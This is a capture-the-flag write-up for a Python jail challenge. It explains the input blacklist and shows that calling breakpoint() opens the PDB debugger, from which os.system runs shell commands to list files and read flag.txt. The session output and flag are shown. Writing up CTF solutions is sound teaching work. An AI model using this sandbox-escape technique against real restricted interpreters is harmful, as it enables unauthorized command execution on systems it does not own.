# pickle games 1

## Description:

> Tags: medium

> I filtered everything in my python interpreter, Can you get a shell ?

> Author : 1m4D

> ncat -v --ssl pyjail.challs.shellmates.club 443

> Files : [challenge.py](challenge.py)

## First thoughts:

The challenge is a python jail.

> Note: I wasn't able to solve the challenge because I didn't neither read the documentations nor test all the options I had.
I included the challenge because it had a new thing that I learned from it.

## Reading the script:

Reading the script, we find that the input we provide is tested for:

 - each `ord` character must be less then 127, so only ascii.
 - the input must not contain any character from `BLACKLIST`.
 - the input must not include: `input`, `eval` or `exec`

So basically we are left with the alphabet and `(`, `)`.

## TRYING to solving the challenge:

I opened a separate python interpreter and checked the builtin list using `__builtins__`, and I tried `most` of the functions I found.
The approach I was trying to follow sa getting at least basic operations like addition or subtraction so I could craft a payload that tries to get a shell for me, but I wasn't able to do it.

After the CTF ended, I asked the creator of the challenge, and he asked me about the single function that I didn't try: `breakpoint()`.

For context, `breakpoint()` opens a PDB `Python Debugger`, which is  an interpreter that's used to debug the current state of the main interpreter.

## Solution:

From here, we only call `breakpoint()`, import os or any thing we need, and read the flag.

```py
>>> breakpoint()
--Return--
> <string>(1)<module>()->None
(Pdb) import os
(Pdb) os.system('ls')
challenge.py
entrypoint.sh
flag.txt
0
(Pdb) os.system('cat flag.txt')
shellmates{BR3kP01nT_BuiLT1N_D0_M4g1C_98765}
```

and the flag is:

```
shellmates{BR3kP01nT_BuiLT1N_D0_M4g1C_98765}
```
